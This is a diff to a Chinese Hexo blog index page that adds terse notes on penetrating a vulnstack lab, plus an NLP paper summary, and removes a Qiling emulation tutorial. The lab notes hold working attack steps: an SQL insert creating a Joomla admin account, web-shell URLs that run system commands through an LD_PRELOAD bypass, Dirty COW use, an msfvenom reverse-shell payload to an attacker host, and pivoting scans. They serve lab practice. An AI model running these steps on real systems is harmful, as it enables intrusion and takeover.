@@ -235,6 +235,80 @@
 
 
   
+    <article id="post-note/web/pentist-3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/01/note/web/pentist-3/" class="article-date">
+  	<time datetime="2021-01-01T08:32:17.000Z" itemprop="datePublished">2021-01-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/01/note/web/pentist-3/">
+        靶机看答案渗透记录-3
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>靶机下载地址 <a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></p>
+<p>wp参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/13281772.html">https://www.cnblogs.com/wkzb/p/13281772.html</a></p>
+<p>我的机器上如果所有虚拟机都按照原定内存的话内存不够，所以为了缩减内存，只能先看最后找密码了5555</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win7 123qwe!ASD</span><br><span class="line">08 123qwe!ASD</span><br><span class="line">win10 zxcASDqw123!!</span><br></pre></td></tr></table></figure>
+
+<p>要开启nginx服务，直接执行nginx命令即可(原本是开着的，可是改内存需要关机)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`am2zu_users`</span></span><br><span class="line">   (<span class="string">`name`</span>, <span class="string">`username`</span>, <span class="string">`password`</span>, <span class="string">`params`</span>, <span class="string">`registerDate`</span>, <span class="string">`lastvisitDate`</span>, <span class="string">`lastResetTime`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;Administrator2&#x27;</span>, <span class="string">&#x27;admin2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NOW</span>(), <span class="keyword">NOW</span>(), <span class="keyword">NOW</span>());</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`am2zu_user_usergroup_map`</span> (<span class="string">`user_id`</span>,<span class="string">`group_id`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="keyword">LAST_INSERT_ID</span>(),<span class="string">&#x27;8&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so">http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</a></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so">http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</a></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=cat%20/proc/version&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so">http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=cat%20/proc/version&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</a></p>
+<p>gcc -pthread dirty.c -o dirty -lcrypt</p>
+<p>su firefart/baji</p>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f elf &gt; shell.elf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole&gt;set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msfconsole&gt;set lhost 172.16.45.129</span><br><span class="line">msfconsole&gt;set lport 4444</span><br></pre></td></tr></table></figure>
+
+<p>run autoroute -s 192.168.93.0/24<br>background<br>use auxiliary/scanner/smb/smb_version<br>set rhosts 192.168.93.0/24<br>exploit</p>
+<p>192.168.93.10 2012<br>192.168.93.20 2008<br>192.168.93.30 7</p>
+<p>爆破2008密码这块出问题了，总是readtimeout，先参考其它大师傅的结果吧，Windows 2008密码为123qwe!ASD</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-note/papers/ai/nlp-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -266,6 +340,7 @@
       
         <p>我太菜了，英语还要开着有道翻译读</p>
 <h2 id="A-Systematic-Study-of-Inner-Attention-Based-Sentence-Representations-in-Multilingual-Neural-Machine-Translation"><a href="#A-Systematic-Study-of-Inner-Attention-Based-Sentence-Representations-in-Multilingual-Neural-Machine-Translation" class="headerlink" title="A Systematic Study of Inner-Attention-Based Sentence Representations in Multilingual Neural Machine Translation"></a>A Systematic Study of Inner-Attention-Based Sentence Representations in Multilingual Neural Machine Translation</h2><p><a target="_blank" rel="noopener" href="https://www.mitpressjournals.org/doi/full/10.1162/coli_a_00377">https://www.mitpressjournals.org/doi/full/10.1162/coli_a_00377</a></p>
+<p>探索了一种表示方法，可以产生固定大小的句子代表，被称为“Attention bridge”。这个相当于字然语言处理的一个中间层，这一层提取语句中的语义并且转化为语言无关的意思表示。并证明了下游任务中语句代表不影响翻译性能，并且提升了翻译质量，尤其是长句子翻译。短的语句代表有很多压缩，在不可训练的相似性任务中有益。多余的语句信号对不可训练的任务无益。</p>
 
       
     </div>
@@ -950,83 +1025,6 @@
 
 
   
-    <article id="post-note/rev/qiling" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/11/26/note/rev/qiling/" class="article-date">
-  	<time datetime="2020-11-26T10:20:35.000Z" itemprop="datePublished">2020-11-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/26/note/rev/qiling/">
-        麒麟框架使用--官方示例
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install qiling</span><br></pre></td></tr></table></figure>
-<p>另外如果需要在windows上面执行Linux程序的话，需要copy windows的dll到linux，并且需要写一个登记</p>
-<p>官方文档说明：<br><a target="_blank" rel="noopener" href="https://docs.qiling.io/en/latest/install/">https://docs.qiling.io/en/latest/install/</a></p>
-<p>对于常用dll，直接执行examples/scripts/dllcollector.bat就可以copy了</p>
-<ol>
-<li>在linux上面模拟windows执行环境</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sandbox to emulate the EXE</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span>(<span class="params">path, rootfs</span>):</span></span><br><span class="line">    <span class="comment"># setup Qiling engine</span></span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    <span class="comment"># now emulate the EXE</span></span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># execute Windows EXE under our rootfs</span></span><br><span class="line">    my_sandbox([<span class="string">&quot;examples\\rootfs\\x86_windows\\bin\\x86_hello.exe&quot;</span>], <span class="string">&quot;examples/rootfs/x86_windows&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>patch程序</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_call_dialog_func</span>(<span class="params">ql</span>):</span></span><br><span class="line">    <span class="comment"># get DialogFunc address</span></span><br><span class="line">    lpDialogFunc = ql.unpack32(ql.mem.read(ql.reg.esp - <span class="number">0x8</span>, <span class="number">4</span>))</span><br><span class="line">    <span class="comment"># setup stack memory for DialogFunc</span></span><br><span class="line">    ql.stack_push(<span class="number">0</span>)</span><br><span class="line">    ql.stack_push(<span class="number">1001</span>)</span><br><span class="line">    ql.stack_push(<span class="number">273</span>)</span><br><span class="line">    ql.stack_push(<span class="number">0</span>)</span><br><span class="line">    ql.stack_push(<span class="number">0x0401018</span>)</span><br><span class="line">    <span class="comment"># force EIP to DialogFunc</span></span><br><span class="line">    ql.reg.eip = lpDialogFunc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span>(<span class="params">path, rootfs</span>):</span></span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    <span class="comment"># NOP out some code</span></span><br><span class="line">    ql.patch(<span class="number">0x004010B5</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x004010CD</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x0040110B</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x00401112</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="comment"># hook at an address with a callback</span></span><br><span class="line">    ql.hook_address(force_call_dialog_func, <span class="number">0x00401016</span>)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sandbox([<span class="string">&quot;rootfs/x86_windows/bin/Easy_CrackMe.exe&quot;</span>], <span class="string">&quot;rootfs/x86_windows&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>模拟gdbserver</li>
-</ol>
-<p>演示程序地址<br><a target="_blank" rel="noopener" href="https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Reversing/Elf_basic">https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Reversing/Elf_basic</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">&#x27;examples/rootfs/x8664_linux/bin/AnokhREV&#x27;</span>],<span class="string">&#x27;examples/rootfs/x8664_linux&#x27;</span>,output=<span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">    ql.gdb = <span class="string">&#x27;0.0.0.0:9999&#x27;</span></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure>
-<p>这个例子不知道为何跑起来之后gdb并没有阻塞</p>
-<ol start="4">
-<li>qltool例子</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1037,7 +1035,7 @@
   <div class="outer">
     <div id="footer-info">
       <div class="footer-left">
-        &copy; 2020 John Doe
+        &copy; 2021 John Doe
       </div>
         <div class="footer-right">
           <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
